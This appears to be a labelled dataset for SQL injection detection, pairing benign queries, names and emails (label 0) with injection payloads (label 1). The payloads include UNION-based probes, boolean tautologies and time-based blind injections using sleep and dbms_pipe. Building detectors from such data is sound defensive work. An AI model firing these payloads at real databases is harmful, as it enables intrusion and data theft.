Payload	Attacker
SELECT AVG ( gradually ) FROM load SELECT SUM ( average ) 	0
guardia, la	0
SELECT * FROM  ( SELECT highway FROM walk ) 	0
1'+  (  select 'wyxu' where 2555  =  2555 union all select null#	1
SELECT AVG ( war ) FROM layers SELECT SUM ( men ) 	0
SELECT * FROM inch WHERE original BETWEEN '1996-07-01' AND '1996-07-31'	0
ilsup	0
1   )    )    as hrks where 7637  =  7637 or elt  (  6272  =  6272,sleep  (  5   )    )   --	1
 UPDATE by SET rather = 'adjective'WHERE too = 'interest'	0
1 where 2956  =  2956	1
"1""   )    )    as nncz where 2331  =  2331"	1
1581120000000000	0
lilien@aprendeaestudiar.lt	0
86a7o	0
select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   'kyos' like 'kyos	1
SELECT AVG ( rocket )  FROM scientist  SELECT SUM ( gently ) 	0
  UPDATE sale SET jar =  'shorter', City =  'chain' WHERE occur =  ordinary	0
-2530%' order by 1#	1
select count  (  *  )   from generate_series  (  1,5000000   )    )   +'	1
SELECT option_value FROM wp_options WHERE option_name  =  '_houzez_property_status_3141' LIMIT 1	0
claudio	0
gonzales_thalasso@magadan.com.jm	0
8466	0
select dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  70  )  ||chr  (  106  )  ||chr  (  78  )  ,5  )   from dual--	1
1%'   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #	1
espinosa@chicashumedas.net	0
"-2959"" union all select 3414,3414,3414,3414,3414,3414,3414,3414#"	1
1'  )   where 4786  =  4786 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --	1
1'||  (  select 'blvu' from dual where 9813  =  9813	1
SELECT * FROM species WHERE ill BETWEEN 'give' AND 'declared'	0
